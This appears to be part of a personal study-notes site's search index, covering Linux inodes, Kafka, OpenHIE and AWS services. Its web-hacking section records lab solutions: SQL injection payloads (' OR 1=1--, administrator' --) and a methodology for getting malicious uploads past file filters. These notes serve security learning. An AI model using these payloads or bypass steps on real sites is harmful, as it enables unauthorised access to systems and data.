contains the following information:</p> <ul> <li>File type (directory, file, symbolic link)  </li> <li>Owner (user ID / UID)  </li> <li>Group (group ID / GID)  </li> <li>Access permissions (owner, group, others)  </li> <li>Timestamps (last access, modification, etc.)  </li> <li>Number of hard links to the file  </li> <li>File size in bytes  </li> <li>Pointers to the data blocks of the file  </li> </ul> <p></p>"},{"location":"linux/Inode/#in-depth-understanding-of-inodes","title":"In-depth Understanding of Inodes","text":"<p>Let\u2019s take the above figure as an example to analyze inodes in depth. Here, we are looking at the inode entry of the <code>/etc/passwd</code> file. This file stores user login information, such as username, UID, GID, and login shell.</p> <p>To reach <code>/etc/passwd</code>, the root directory (<code>/</code>) must be accessed first. The root directory has its own inode entry, determined from the superblock. The inode entry for <code>/</code> stores its permissions, type, UID, and GID. Using this information, the system determines whether access is allowed.  </p> <p>From there, <code>/</code> (which is a directory) contains a pointer to <code>/etc</code> (inode 7 in the figure). <code>/etc</code> in turn contains a pointer to <code>passwd</code> (inode 6422). Finally, using the pointer for <code>passwd</code>, the system locates the <code>/etc/passwd</code> file.</p> <p>Important: An inode does not store the names of directories or files.  </p>"},{"location":"linux/Inode/#understanding-directory-files","title":"Understanding Directory Files","text":"<p>Directories are special files that act as containers, holding access paths to other files in the filesystem. A directory entry typically contains:  </p> <ul> <li>The directory name  </li> <li>The inode number  </li> <li>The length of the directory entry (in bytes)  </li> </ul> <p>The figure above shows directory entries for <code>/etc</code> and <code>/</code>.  </p> <p>Reference link</p>"},{"location":"linux/Inode/#hard-links","title":"Hard Links","text":"<p>Each file or directory in Linux has a name stored in the directory entry, along with its inode number. Since inodes do not store file names, we can create multiple names (links) for the same inode. These are known as hard links.</p> <p>A hard link points directly to the same inode entry. For example, if we create a hard link named <code>bar</code> for a file named <code>foo</code>, both <code>foo</code> and <code>bar</code> will point to the same inode. If one file is deleted, the other continues to exist because the inode still has references. The link count increases when hard links are created.</p> <p>Limitations of hard links: - Cannot be created for directories (to avoid circular references). - Work only within a single filesystem, since inode numbers are unique only within that filesystem.  </p> <p></p>"},{"location":"linux/Inode/#in-depth-example-with-an-inode-table","title":"In-depth Example with an Inode Table","text":"<p>In the figure above, we have a file named <code>this</code>. A hard link is created with the name <code>that</code>. Both <code>this</code> and <code>that</code> point to the same inode (61), which points to the file\u2019s actual data blocks.</p>"},{"location":"linux/Inode/#symbolic-soft-links","title":"Symbolic (Soft) Links","text":"<p>A symbolic link (or soft link) works differently. Instead of pointing to an inode directly, a symbolic link stores the name of the target file.</p> <p></p> <p>Breaking down the figure: We create a symbolic link called <code>other</code>, pointing to <code>/home/kiran/other</code>. This path resolves to inode 309, which then points to <code>/home/erena/this</code>. Here, <code>other</code> is a symbolic link to the name <code>this</code>.  </p> <p>Key differences compared to hard links: - The link count does not increase when creating a symbolic link. - Symbolic links overcome the limitations of hard links:   - They can be created for directories.   - They can span multiple filesystems.  </p>"},{"location":"linux/Inode/#where-are-they-used","title":"Where Are They Used?","text":"<ul> <li>Hard links: Useful for backup and recovery. By creating multiple links to important files, accidental deletion can be avoided. They are also space-efficient, since multiple filenames can point to the same data blocks.  </li> <li>Soft links: Commonly used as shortcuts to files or directories. They can also reference files across different filesystems.  </li> </ul>"},{"location":"linux/Inode/#creating-links","title":"Creating Links","text":"<p>The <code>ln</code> command is used to create both hard and soft links.  </p>"},{"location":"linux/Inode/#creating-a-hard-link","title":"Creating a hard link","text":"<pre><code>ln /path/to/original/file /path/to/hardlink\n</code></pre>"},{"location":"linux/Inode/#creating-a-soft-symbolic-link","title":"Creating a soft (symbolic) link","text":"<pre><code>ln -s /path/to/original/file /path/to/softlink\n</code></pre>"},{"location":"majorproject/apache%20kafka/","title":"Apache kafka","text":"<ul> <li>decoupling of data streams and systems</li> <li>for a single company or system we have source system and the target system client side and the server side</li> <li> </li> </ul> <p>the format is :</p> <p>real world events( iot , insurances , logistics shipping ) -&gt; producer(application that we write ) -&gt; kafka cluster( made up of brokers)</p> <p>brokers can be anything (container , vms , machines ) with their own local storage</p> <p>glossary terms: * producer: * consumer: * broker: * topic: * zookeper:</p> <p>topic: </p> <p>topic partition and segments </p>"},{"location":"majorproject/openHIE/","title":"openHIE","text":"<p>community of people building an open framework to support nations as they develop health information exchanges (HIEs) to improve patient care, public health, and the management of health resources</p>"},{"location":"majorproject/openHIE/#course-1-introduction-to-hie","title":"course 1 : introduction to HIE :","text":""},{"location":"majorproject/openHIE/#why-is-hie-important","title":"why is HIE important?","text":"<p>Typically health data is captured at a point-of-care or point-of-service system like an EMR or a Lab system. A blueprint or strategy for the different components that are needed to effectively categorize and use health data, begins to outline the structure that enables disparate systems to share and exchange data that can support effective use of health data to serve patients, population health and help plan for and utilize health resources.</p>"},{"location":"majorproject/openHIE/#what-is-hie","title":"what is HIE?","text":"<p>Health information exchange (HIE) is the exchange of healthcare information electronically across organizations within a hospital system, region, or country.</p> <ul> <li>Provides the capability to electronically transfer clinical information among different health care information systems.</li> <li>It makes the sharing of health data across information systems possible</li> <li>Normalizes data and secures the transmission of health information throughout databases, between facilities, and across regions or countries.</li> </ul>"},{"location":"majorproject/openHIE/#architecture","title":"architecture:","text":"<p>another example:</p> <p></p> <p></p>"},{"location":"majorproject/openHIE/#so-that-was-hienow-what-exactly-is-openhie","title":"so that was HIE.now what exactly is openHIE?","text":"<p>OpenHIE is an open community of practice with participation from anyone who desires to contribute.\u00a0 example lists:</p> <ul> <li>Ministries of Health (MoH)/ Government/ National bodies,\u00a0</li> <li>Implementers and software creators,</li> <li>Funders,\u00a0</li> <li>Domain experts/technical experts,\u00a0</li> <li>Developers wanting to adopt and implement OpenHIE Standards,\u00a0</li> <li>End users/Health Care Team,</li> </ul>"},{"location":"majorproject/openHIE/#some-glossary-terms","title":"some glossary terms:","text":"<ul> <li> <p>interoperability:     The ability of computer systems or software to exchange and make use of information</p> </li> <li> <p>standardization:     Semantic \u201cword\u201d standards: Country established or internationally established (ICD10, SNOMED). </p> <ul> <li>Colour and Color</li> <li>BP and Blood Pressure</li> <li>Coding and terminology sets</li> </ul> </li> <li> <p>harmonization:</p> </li> </ul> <p></p> <ul> <li> <p>Point of service:     Point-of-service applications are used by clinicians and by community health workers to access and update a patient\u2019s person-centric shared health information and to record healthcare transactions.</p> </li> <li> <p>Business Domain Services:     Business Domain Services are Health Exchange components that are designed to support specific health system business domains and would have the potential to combine data Health Exchange data from multiple point-of-care systems.</p> </li> <li> <p>Registry Services:     Registry Services are Health Exchange Components that are designed to support registries with data that is used by other Health Exchange components.</p> </li> </ul>"},{"location":"majorproject/openHIE/#use-case-example-self-explanatory","title":"USE CASE example self explanatory:","text":"<p>ram(an HIV patient) is registered at HealthPost  ---&gt; his data  is recorded by EMR(electronic medical records ) fig_below --&gt; forwarded to interoperable system (after authentication) ---&gt;client registry is checked to match demographic data and create link with other records ---&gt;local EMR is shared with SHR (shared record) </p> <p>use case scenario    ram experiences bleeding ---&gt; his neighbor reports it to the health app ---&gt; found anemic and flagged urgent and recorded on SHR ---&gt; days later ram has not gone to hospital ---&gt; health app sends notification to neighbor ---&gt; ram is taken to health care.</p> <p></p>"},{"location":"notes/WebHacking/SQL%20lab/","title":"SQL lab","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:</p> <p><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></p> <p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p> <p>i grabbed the url which is https://0af100d004b4ee8484cf8bf7001900b0.web-security-academy.net/filter?category=Gifts+OR+1=1--</p> <p>gave me  </p> <p>now modifying the url a bit  adding ' after gifts on above url gives the results https://0af100d004b4ee8484cf8bf7001900b0.web-security-academy.net/filter?category=Gifts%20%27%20+or+1=1%20--</p>"},{"location":"notes/WebHacking/SQL%20lab/#lab2","title":"lab2","text":"<p>clicked on the login page  https://0a7c008c04611bca82e7c45f0036007d.web-security-academy.net/login and inputted admininstrator ' -- and random word for password which solved the lab</p>"},{"location":"notes/WebHacking/methodology/","title":"Methodology","text":"<p>We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.</p> <ol> <li> <p>The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as <code>server</code> or <code>x-powered-by</code> can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.  </p> </li> <li> <p>Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.</p> </li> <li>We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline \"accepted\" file which we can base further testing on.<ul> <li>An important Gobuster switch here is the <code>-x</code> switch, which can be used to look for files with specific extensions. For example, if you added <code>-x php,txt,html</code> to your Gobuster command, the tool would append <code>.php</code>, <code>.txt</code>, and <code>.html</code> to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.</li> </ul> </li> <li>Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.</li> </ol> <p>Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:</p> <ul> <li>If you can successfully upload a file with a totally invalid file extension (e.g. <code>testingimage.invalidfileextension</code>) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.</li> <li>Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.</li> <li>As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.</li> <li>Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.  </li> </ul>"},{"location":"notes/WebHacking/notes%20on%20sql/","title":"Notes on sql","text":"<p>union select</p>"},{"location":"notes/WebHacking/recon/","title":"Recon","text":"<p> reference : https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/mobilepresent#slide=id.g4052c4692d_0_264</p> <p>asset discovery: </p> <p>content discovery: </p> <p>github recon </p> <p></p> <p>tools </p>"},{"location":"notes/cloud/AWS%20Config/","title":"AWS Config","text":""},{"location":"notes/cloud/AWS%20Config/#overview","title":"Overview","text":"<p>AWS Config is a fully managed service that helps you assess, audit, and evaluate the configurations of your AWS resources over time. AWS Config allows you to track configuration changes, assess compliance with internal policies, and gain insights into your AWS environment. It plays a crucial role in helping organizations ensure that their AWS resources remain properly configured and compliant with security and regulatory standards.</p>"},{"location":"notes/cloud/AWS%20Config/#key-features-of-aws-config","title":"Key Features of AWS Config","text":"<ol> <li>Auditing and Recording Compliance:</li> <li>AWS Config continuously monitors the configuration of your AWS resources, providing a historical record of configuration changes.</li> <li>It answers crucial questions like:<ul> <li>Is there unrestricted SSH access to my security groups?</li> <li>Do my buckets have any public access?</li> <li>How has my Application Load Balancer (ALB) configuration changed over time?</li> </ul> </li> </ol> <p>Example:     - If you are worried about SSH access to your security groups, AWS Config can track the configuration of the security group over time and notify you when an unrestricted rule is added.</p> <ol> <li>Alerting (SNS Notifications):</li> <li>You can set up SNS (Simple Notification Service) notifications to alert you whenever a resource configuration goes out of compliance or when a change is detected.</li> <li> <p>Notifications can be sent via email, SMS, or other channels supported by SNS.</p> </li> <li> <p>Per-Region Service:</p> </li> <li>AWS Config operates at the region level. Each region has its own configuration history.</li> <li> <p>However, you can aggregate AWS Config data across multiple regions and accounts for a centralized view.</p> </li> <li> <p>Data Storage in Amazon S3:</p> </li> <li>Configuration history can be stored in Amazon S3 for long-term storage and further analysis.</li> <li>You can use AWS Athena to query this data for deeper insights.</li> </ol>"},{"location":"notes/cloud/AWS%20Config/#config-rules","title":"Config Rules","text":"<p>AWS Config Rules allow you to create policies for evaluating the compliance of your AWS resources. Config Rules are evaluated on configuration changes or at regular time intervals.</p>"},{"location":"notes/cloud/AWS%20Config/#aws-managed-config-rules","title":"AWS Managed Config Rules","text":"<p>AWS provides a collection of over 75 pre-built (managed) rules that can be applied to your AWS resources without needing to write custom code.</p> <p>Examples: 1. EBS Volume Type: Ensure that all EBS volumes are of type <code>gp2</code>. 2. EC2 Instance Type: Ensure that only instances of type <code>t2.micro</code> are used in a particular region.</p>"},{"location":"notes/cloud/AWS%20Config/#custom-config-rules","title":"Custom Config Rules","text":"<p>If the AWS-managed rules do not meet your specific needs, you can create custom Config Rules using AWS Lambda functions.</p> <p>Example: - You might want to check that all EC2 instances are tagged with a <code>Cost Center</code> tag. You would write a custom Lambda function that evaluates the presence of the <code>Cost Center</code> tag and set it as a rule.</p>"},{"location":"notes/cloud/AWS%20Config/#evaluation-triggers","title":"Evaluation Triggers","text":"<ul> <li>On Configuration Changes: Whenever a resource's configuration changes, AWS Config evaluates it against the set rules.</li> <li>At Regular Intervals: You can set AWS Config to check resources periodically, like every hour.</li> </ul>"},{"location":"notes/cloud/AWS%20Config/#pricing","title":"Pricing","text":"<ul> <li>Configuration Item Recording: $0.003 per configuration item per region.</li> <li>Config Rule Evaluations: $0.001 per evaluation per region.</li> </ul> <p>Note: There is no free tier for AWS Config.</p>"},{"location":"notes/cloud/AWS%20Config/#config-resource","title":"Config Resource","text":"<p>AWS Config helps you track the compliance and configuration history of your resources over time. You can view:</p> <ol> <li>Compliance History: A record of whether your resources were compliant with the rule over time.</li> <li>Configuration History: A snapshot of the configuration of a resource at different points in time.</li> <li>CloudTrail API Calls: You can trace changes made to a resource and track who made the change and when.</li> </ol>"},{"location":"notes/cloud/AWS%20Config/#config-rules-remediations","title":"Config Rules - Remediations","text":"<p>Automated Remediation: When a resource is found to be non-compliant, AWS Config can trigger SSM (Systems Manager) Automation documents to automatically fix the non-compliance.</p>"},{"location":"notes/cloud/AWS%20Config/#example","title":"Example:","text":"<ul> <li>IAM Access Key Expiration: If an IAM access key is not used for 90 days, AWS Config can automatically deactivate the key using an SSM automation document.</li> </ul> <p>Custom Remediation: You can write custom Automation Documents that trigger Lambda functions to remediate issues.</p> <p>Remediation Retries: If a resource remains non-compliant after the first remediation attempt, AWS Config can retry the remediation process a certain number of times.</p>"},{"location":"notes/cloud/AWS%20Config/#config-rules-notifications","title":"Config Rules - Notifications","text":"<p>You can use Amazon EventBridge to trigger notifications when a resource is non-compliant.</p> <ol> <li>EventBridge and SNS: </li> <li>Use SNS topics to send notifications. </li> <li> <p>These notifications can trigger actions like sending an email or invoking a Lambda function.</p> </li> <li> <p>Filter Events: EventBridge allows you to filter AWS Config events, so you can focus on only the most important events.</p> </li> </ol> <p>Example:  - If an EC2 instance is launched without a <code>Backup</code> tag, AWS Config can trigger a notification that informs your DevOps team to correct the issue.</p>"},{"location":"notes/cloud/AWS%20Config/#cloudwatch-vs-cloudtrail-vs-config","title":"CloudWatch vs CloudTrail vs Config","text":""},{"location":"notes/cloud/AWS%20Config/#differences","title":"Differences:","text":"<ol> <li>CloudWatch: </li> <li>Focuses on performance monitoring, collecting metrics like CPU, memory, disk usage, and network traffic.</li> <li> <p>Provides event alerting and log aggregation.</p> </li> <li> <p>CloudTrail: </p> </li> <li>Records API calls made by users, services, or resources within your AWS account.</li> <li> <p>Tracks user actions for security auditing and compliance purposes.</p> </li> <li> <p>AWS Config: </p> </li> <li>Tracks configuration changes and ensures resources comply with policies.</li> <li>Provides a historical timeline of changes and compliance status.</li> </ol>"},{"location":"notes/cloud/AWS%20Config/#example-elastic-load-balancer-elb","title":"Example: Elastic Load Balancer (ELB)","text":"<ol> <li>CloudWatch: Monitors incoming connections, error codes, and other performance metrics. </li> <li> <p>Example: You can create a dashboard to visualize error codes as a percentage over time.</p> </li> <li> <p>Config: Monitors the configuration of the ELB, such as security group rules and SSL certificate assignment.</p> </li> <li> <p>Example: Ensures that your ELB always has an SSL certificate assigned.</p> </li> <li> <p>CloudTrail: Tracks who made changes to the ELB through API calls.</p> </li> <li>Example: CloudTrail records the API calls to update the ELB configuration and who made them.</li> </ol>"},{"location":"notes/cloud/AWS%20Config/#conclusion","title":"Conclusion","text":"<p>AWS Config plays a crucial role in helping you maintain the security, compliance, and operational integrity of your AWS environment. By automating compliance checks, tracking configuration changes, and integrating with services like CloudTrail and CloudWatch, AWS Config ensures that your resources stay in line with organizational policies.</p> <p>Real-World Analogy:</p> <p>Think of AWS Config as a compliance officer in a company who keeps track of all the configurations (settings) of the organization's assets (AWS resources). This officer ensures that every asset (e.g., EC2 instances, security groups, etc.) is in line with company policies. If a new policy is implemented (e.g., SSH access is restricted), the compliance officer (AWS Config) checks if all assets are compliant, and if not, triggers an automatic action (remediation) or sends an alert to the responsible team.</p>"},{"location":"notes/cloud/AWS%20EventBridge/","title":"Amazon EventBridge","text":"<p>Amazon EventBridge is a fully managed event bus service that facilitates event-driven architecture in AWS. It enables you to react to events from AWS services, custom applications, and SaaS providers in real-time. EventBridge allows you to build highly scalable and flexible event-based applications.</p> <p>Let\u2019s break down the core concepts of Amazon EventBridge in detail:</p>"},{"location":"notes/cloud/AWS%20EventBridge/#eventbridge-components","title":"\ud83d\udd70\ufe0f EventBridge Components","text":""},{"location":"notes/cloud/AWS%20EventBridge/#1-event-bus","title":"1. Event Bus","text":"<p>An Event Bus is a central hub that receives, processes, and routes events. EventBridge supports three types of event buses:</p> <ul> <li>Default Event Bus: Automatically created for AWS services like EC2, S3, etc.</li> <li>Partner Event Bus: For events from AWS SaaS partners (e.g., Zendesk, Datadog).</li> <li>Custom Event Bus: Created by you for custom events from your applications.</li> </ul> <p>You can configure these event buses to send and receive events across AWS accounts and services.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#2-event-patterns","title":"2. Event Patterns","text":"<p>An Event Pattern defines the criteria for matching events. It acts as a filter, ensuring that only events that meet specific conditions are passed to your targets.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#example","title":"Example:","text":"<p>If you want to capture events from an EC2 instance state change, you would create an event pattern like this:</p> <pre><code>{\n  \"source\": [\"aws.ec2\"],\n  \"detail-type\": [\"EC2 Instance State-change Notification\"],\n  \"detail\": {\n    \"state\": [\"stopped\"]\n  }\n}\n</code></pre> <p>This pattern matches events where an EC2 instance has transitioned to the \"stopped\" state.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#3-scheduled-events-cron-jobs","title":"3. Scheduled Events (Cron Jobs)","text":"<p>EventBridge can act like a cron job to schedule tasks based on a time interval. You can specify cron expressions to trigger actions at regular intervals (e.g., every hour, every day).</p>"},{"location":"notes/cloud/AWS%20EventBridge/#example_1","title":"Example:","text":"<p>To trigger a Lambda function every hour, you could create a scheduled event pattern like this:</p> <pre><code>{\n  \"schedule\": \"rate(1 hour)\"\n}\n</code></pre> <p>This would trigger the event every hour, which could, for instance, trigger a script running in a Lambda function.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#eventbridge-targets","title":"\ud83c\udfaf EventBridge Targets","text":"<p>Once an event is captured, EventBridge routes it to targets. Targets can be various AWS services or custom endpoints, including:</p> <ul> <li>Lambda functions: To run code in response to events.</li> <li>SNS topics: To send notifications.</li> <li>SQS queues: To add messages for later processing.</li> <li>Kinesis Data Streams: For stream processing.</li> <li>AWS Batch: To process jobs asynchronously.</li> <li>Step Functions: To orchestrate workflows.</li> </ul> <p>You can specify one or multiple targets for each event rule.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#example_2","title":"Example:","text":"<p>If an EC2 instance state changes to \"stopped,\" EventBridge can send that event to a Lambda function and also send a notification to an SNS topic.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#eventbridge-permissions","title":"\ud83d\udd10 EventBridge Permissions","text":"<p>EventBridge events can be accessed by other AWS accounts using Resource-based Policies, which provide fine-grained control over who can publish or consume events.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#example_3","title":"Example:","text":"<p>You can allow Account A to publish events to Account B\u2019s event bus by specifying the permissions in the resource policy of the event bus.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#eventarchiving-and-replays","title":"\ud83d\uddc4\ufe0f EventArchiving and Replays","text":""},{"location":"notes/cloud/AWS%20EventBridge/#event-archiving","title":"Event Archiving","text":"<p>EventBridge allows you to archive events that are sent to your event bus. You can archive all events or just a subset based on filters. Archived events can be stored for an indefinite period or for a specific time range (e.g., 30 days). Archiving is beneficial for:</p> <ul> <li>Audit purposes: You can keep track of all events for compliance and debugging.</li> <li>Long-term storage: Storing historical events to replay or analyze later.</li> </ul>"},{"location":"notes/cloud/AWS%20EventBridge/#example_4","title":"Example:","text":"<p>Let\u2019s say you have a system that records customer transactions. You might archive all the event data for the past year for auditing and later replay if needed.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#event-replays","title":"Event Replays","text":"<p>EventBridge allows you to replay archived events. This is especially useful when you want to re-trigger actions based on historical events, or troubleshoot and test workflows.</p> <ul> <li>Replay archived events: You can replay events at any time within the retention period.</li> <li>Use cases: Troubleshooting, re-triggering workflows, or recreating specific conditions for testing.</li> </ul> <p>For instance, if a Lambda function failed to process an event earlier, you can replay the event from the archive to ensure the system behaves correctly.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#eventbridge-schema-registry","title":"\ud83e\udde0 EventBridge Schema Registry","text":""},{"location":"notes/cloud/AWS%20EventBridge/#what-is-the-schema-registry","title":"What is the Schema Registry?","text":"<p>EventBridge can analyze the events and infer the schema of the data flowing through the event bus. The Schema Registry is a feature that allows you to manage and version the structure of your event data. This is useful because:</p> <ul> <li>It helps you know in advance what kind of data will be inside your events.</li> <li>It generates code to parse and handle events without errors.</li> </ul>"},{"location":"notes/cloud/AWS%20EventBridge/#how-it-works","title":"How It Works:","text":"<ol> <li>Event Analysis: EventBridge can inspect events and automatically infer the structure (schema) of the data. For example, it can identify fields like <code>timestamp</code>, <code>eventId</code>, or <code>eventType</code>.</li> <li>Schema Versioning: You can store multiple versions of the schema as your event data evolves over time.</li> <li>Code Generation: Based on the schema, EventBridge can generate data models in programming languages like Java, Python, and others. This helps developers avoid errors and ensures compatibility when processing events.</li> </ol>"},{"location":"notes/cloud/AWS%20EventBridge/#example_5","title":"Example:","text":"<p>Imagine you're sending EC2 instance state change events. EventBridge might infer a schema like this:</p> <pre><code>{\n  \"instanceId\": \"i-1234567890abcdef0\",\n  \"state\": \"stopped\",\n  \"timestamp\": \"2021-06-01T12:00:00Z\"\n}\n</code></pre> <p>The Schema Registry will allow you to version this schema and provide code to your application that knows exactly how to handle this event.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#analogy","title":"Analogy:","text":"<p>Think of the Schema Registry as a data blueprint. Just like architects use blueprints to know the exact layout of a building, developers can use the schema to know exactly how the event data will be structured. This removes any guesswork when processing the events.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#example-use-cases-of-amazon-eventbridge","title":"\ud83e\udde9 Example Use Cases of Amazon EventBridge","text":""},{"location":"notes/cloud/AWS%20EventBridge/#1-real-time-processing","title":"1. Real-Time Processing","text":"<p>You can use EventBridge to trigger Lambda functions based on events such as: - EC2 instance state changes - S3 object uploads - DynamoDB table updates</p>"},{"location":"notes/cloud/AWS%20EventBridge/#2-application-integration","title":"2. Application Integration","text":"<p>EventBridge allows you to integrate different applications by sending custom events. For example: - Send data from your application to a custom EventBus. - Automatically trigger workflows in AWS Step Functions based on events.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#3-automated-scaling","title":"3. Automated Scaling","text":"<p>You can automatically scale your infrastructure by triggering Auto Scaling actions in response to events such as high traffic, new users, or system failures.</p>"},{"location":"notes/cloud/AWS%20EventBridge/#eventbridge-vs-cloudwatch-events","title":"\ud83d\udcca EventBridge vs. CloudWatch Events","text":"<p>While EventBridge was originally known as CloudWatch Events, EventBridge is now more powerful, as it supports not only AWS services but also SaaS applications, custom events, and advanced event patterns.</p> Feature Description Event Buses Centralized hubs to receive and route events (default, partner, custom) Event Patterns Filter events based on conditions like source, state, etc. Scheduled Events (Cron) Schedule tasks using cron expressions (e.g., trigger every 1 hour) Event Targets AWS services or custom endpoints where events are routed (Lambda, SNS, SQS, etc.) Archiving &amp; Replays Store and replay events for auditing or troubleshooting Schema Registry Manage and version event data structures to generate application code"},{"location":"notes/cloud/AWS%20EventBridge/#conclusion","title":"\ud83e\udde9 Conclusion","text":"<p>Amazon EventBridge is a powerful event-driven service that helps you decouple application components, automate workflows, and integrate multiple services. Whether you're reacting to AWS service events or creating your own custom events, EventBridge provides the flexibility, scalability, and ease of use needed for modern serverless architectures.</p>"},{"location":"notes/cloud/CloudBasics/","title":"CloudBasics","text":""},{"location":"notes/cloud/CloudBasics/#module1","title":"Module1:","text":""},{"location":"notes/cloud/CloudBasics/#definition","title":"Definition:","text":"<p>Cloud computing is on-demand delivery of IT services over the internet on pay as you go basis.</p>"},{"location":"notes/cloud/CloudBasics/#why-cloud-computing-is-needed","title":"Why cloud computing is needed?","text":"<p>Cloud computing treats IT assets as programmatic resources that can be torn up and set up.Provides dynamic and flexible arrangement for customers to meet their needs. More importantly cloud computing offers Pay-As-you-go feature to test and use the system.</p>"},{"location":"notes/cloud/CloudBasics/#client-server-model","title":"Client-Server model","text":"<p>Client can be a web browser or a desktop which the users interact with. They ask for resources from the Server. Server in modern computing is Amazon EC2 virtual servers.</p>"},{"location":"notes/cloud/CloudBasics/#benefits-of-cloud-computing","title":"Benefits of cloud computing","text":"<ol> <li>variable expense for upfront expense</li> <li>No manual setting up of data center. Reduction of upfront cost.</li> <li>Global in minutes upfront expense is the wealth you normally spend on data  center, physical servers while variable expense is the wealth you only for computing resources you consume.</li> </ol>"},{"location":"notes/cloud/CloudBasics/#cloud-computing-service-models","title":"Cloud computing service models","text":"<p>There are three cloud computing service models i.e IaaS, SaaS and SaaS.</p> <p>IaaS: Infrastructure as a service typically provide access to  hardware and networking resources .for example Amazon EC2 , Amazon S3 are examples of Iaas.</p> <p>PaaS: Platform as a service remove the overhead of managing the underlying infrastructure and remain centered on deployment and management of applications. An example of PaaS is Amazon elastic BeanStalk.</p> <p>SaaS: Software as a service is fully completed software product .The consumer of the cloud service user do not have to worry about the underlying infrastructure and hardware resources on play.</p>"},{"location":"notes/cloud/CloudBasics/#cloud-computing-deployment-models","title":"Cloud Computing Deployment Models","text":"<p>There are three types of cloud deployment models namely Public cloud, Private cloud and Hybrid cloud. </p> <p>Public cloud: on public cloud models users can either migrate their applications to cloud or you can design and build own applications using the cloud computing resources and infrastructures.</p> <p>Private cloud: private cloud or the on-premise cloud requires that the infrastructures like data centers, networking components are established locally.</p> <p>Hybrid cloud: Hybrid cloud requires that the consumer uses both the properties of public and private cloud. This can offer greater advantages in terms of security, flexibility and availability.</p>"},{"location":"notes/cloud/CloudBasics/#module2","title":"Module2:","text":"<p>AWS offers broad set of 175 global cloud based  services which include databases, compute, Storage, analytics, developer tools, business applications, management tools, machine learning, internet of things and security. </p>"},{"location":"notes/cloud/CloudBasics/#aws-services","title":"AWS Services","text":"<p>Compute: EC2, Lambda, Elastic Beanstalk. Storage: EFS, S3. Database: RDS, DynamoDB. Analytics: Athena, Amazon Redshift. Networking and content delivery: VPC, CloudFront, Route53. Developer tools: codestar, codecommit, codedeploy, codeartifact. Management and Governance: cloudwatch, cloudformation, cloudtrail.  Machine learning: Amazon sagemaker, Amazon codeguru, Amazon devopsguru. Internet of Things: IoT core, IoT Analytics. Business applications: Amazon pinpoint, Amazon connect. Security Identity and compliance: IAM, Resource Access Manager, Cognito, GuardDuty, Inspector.</p>"},{"location":"notes/cloud/CloudBasics/#aws-cloud-global-infrastructure","title":"AWS Cloud Global Infrastructure:","text":"<p>The main components of the AWS Global Infrastructure are Regions, EdgeLocations, Availability Zones. </p> <p>AWS has the concept of Region which is the physical location around the world where the data centers are clustered together. A group of logical data centers is called Availability zone. An Availability zone is a region in a zoned area that can harbor one or more data centers.Availability zones are interconnected by low latency networking to provide replication. Demo Examples: Region: South America(sau paulo) 3AZ. Region: Asia pacific Mumbai 3AZ.</p>"},{"location":"notes/cloud/CloudBasics/#how-aws-global-infrastructure-can-be-used-to-plan-for-failure","title":"How AWS global infrastructure can be used to plan for failure.","text":"<p>In terms of storage, compute and database. Whenever a file is stored in Amazon S3, the file is redundantly copied to every availability zones in that region. If one fails we still have two other options. Always spread out computing resources to multiple availability zones to guarantee high availability. similar for database. Make multiple copies on multiple AZs.</p>"},{"location":"notes/cloud/CloudBasics/#aws-global-infrastructure-benefits","title":"AWS Global Infrastructure benefits:","text":"<p>The benefits offered are performance, availability, Security, Reliability, Scalability and low cost. performance : provides high performing low latency cloud infrastructure with virtually unlimited capacity. Availability Zones: provides physical redundancy and to provide resilience. Security: Infrastructure is monitored 24/7 to help ensure CIA.</p>"},{"location":"notes/cloud/CloudBasics/#aws-shared-responsibility","title":"AWS shared responsibility:","text":"<p>It is a security model that is used to protect cloud infrastructures. Shared responsibility model is further divided into two parts. Cloud provider or AWS is responsible for security in the cloud and the customers are responsible for security in the cloud. </p> <p>Above figure entails that customers are responsible for firewall , OS and network configuration , client-side data encryption and platform, application and identity and access management. Moreover AWS is responsible for compute, storage, Database, Networking protection and AZ , Region, and edge locations 